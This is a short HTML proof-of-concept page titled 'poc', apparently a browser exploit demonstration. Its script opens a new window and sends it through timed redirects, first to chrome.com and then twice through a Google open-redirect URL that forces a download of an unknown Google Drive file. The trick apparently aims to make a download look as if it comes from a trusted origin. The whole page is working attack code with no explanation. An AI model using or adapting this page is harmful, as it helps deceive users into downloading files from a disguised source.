<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>poc</title>
  <script>
    function chainRedirect(w, urls, index = 0) {
      if (index < urls.length) {
        w.location.replace(urls[index]);
        setTimeout(() => chainRedirect(w, urls, index + 1), 1000);
      }
    }

    function startRedirect() {
      let w = window.open("");
      setTimeout(() => {
        chainRedirect(w, [
        "https://chrome.com",
        "https://www.google.com/url?q=https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=f5135ddf-0e72-4bff-91fe-7b75066ebecc&at=AGN2oQ15c4RY8i9lUXdjJeJAyOm7:1773898171093",
        "https://www.google.com/url?q=https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=f5135ddf-0e72-4bff-91fe-7b75066ebecc&at=AGN2oQ15c4RY8i9lUXdjJeJAyOm7:1773898171093",
        ]);
      }, 1000);
    }
  </script>
</head>
<body>
  <button onclick="startRedirect()">Start</button>
</body>
</html>
